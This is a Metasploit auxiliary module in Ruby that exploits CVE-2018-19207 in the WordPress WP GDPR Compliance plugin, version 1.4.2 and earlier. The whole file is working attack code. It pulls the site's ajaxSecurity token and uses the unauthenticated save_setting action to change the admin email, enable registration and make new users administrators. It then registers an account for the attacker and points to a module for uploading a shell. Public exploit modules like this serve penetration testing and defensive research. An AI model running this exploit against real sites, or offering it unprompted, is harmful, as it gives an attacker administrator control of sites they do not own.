##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WordPress WP GDPR Compliance Plugin Privilege Escalation',
      'Description'     => %q{
        The Wordpress GDPR Compliance plugin <= v1.4.2 allows unauthenticated users to set
        wordpress administration options by overwriting values within the database.

        The vulnerability is present in WordPress’s admin-ajax.php, which allows unauthorized
        users to trigger handlers and make configuration changes because of a failure to do
        capability checks when executing the 'save_setting' internal action.

        WARNING: The module sets Wordpress configuration options without reading their current
        values and restoring them later.
      },
      'Author'          =>
        [
          'Mikey Veenstra (WordFence)', # Vulnerability discovery
          'Thomas Labadie' # Metasploit module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          ['URL', 'https://www.wordfence.com/blog/2018/11/privilege-escalation-flaw-in-wp-gdpr-compliance-plugin-exploited-in-the-wild/'],
          ['CVE', '2018-19207'],
          ['WPVDB', '9144']
        ],
      'Notes'           =>
        {
          'SideEffects' =>  [CONFIG_CHANGES]
        },
      'DisclosureDate'  => 'Nov 08 2018'
    ))

    register_options [
      OptString.new('EMAIL', [true, 'Email for registration', nil]),
      OptString.new('USER', [true, 'Username for registration', 'msfuser'])
    ]

    register_advanced_options [
      OptString.new('WPEMAIL', [false, 'Wordpress Administration Email (default: no email modification)', nil])
    ]
  end

  def check
    check_plugin_version_from_readme('wp-gdpr-compliance', '1.4.3')
  end

  def set_wp_option(name, value, ajax_security)
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => wordpress_url_admin_ajax,
      'vars_post' => {
        'action' => 'wpgdprc_process_action',
        'security' => ajax_security,
        'data' => "{\"type\":\"save_setting\",\"append\":false,\"option\":\"#{name}\",\"value\":\"#{value}\"}"
        }
      )

    res && res.code == 200
  end

  def run
    print_status('Getting security token from host...')
    wp_home_res = send_request_cgi(
      'method'    => 'GET',
      'uri'       => target_uri.path
    )

    unless wp_home_res && wp_home_res.code == 200
      fail_with(Failure::UnexpectedReply, "Unable to access Wordpress: #{target_uri.path}")
    end

    ajax_security = wp_home_res.body[/"ajaxSecurity":"([a-zA-Z0-9]+)"/i, 1]

    if datastore['WPEMAIL'].present? && (datastore['WPEMAIL'] =~ URI::MailTo::EMAIL_REGEXP)
      print_warning("Changing admin e-mail address to #{datastore['WPEMAIL']}...")
      unless set_wp_option('admin_email', datastore['WPEMAIL'], ajax_security)
        print_error('Failed to change the admin e-mail address')
        return
      end
    end

    print_warning('Enabling user registrations...')
    unless set_wp_option('users_can_register', '1', ajax_security)
      print_error('Failed to enable user registrations')
      return
    end

    print_warning('Setting the default user role type to administrator...')
    unless set_wp_option('default_role', 'administrator', ajax_security)
      print_error("Failed to set the default user role")
      return
    end

    print_status("Registering #{datastore['USER']} with email #{datastore['EMAIL']}")
    unless (datastore['EMAIL'] =~ URI::MailTo::EMAIL_REGEXP) && wordpress_register(datastore['USER'], datastore['EMAIL'])
      print_error("Failed to register user")
      return
    end

    vprint_good('For a shell: use exploits/unix/webapp/wp_admin_shell_upload')
  end
end
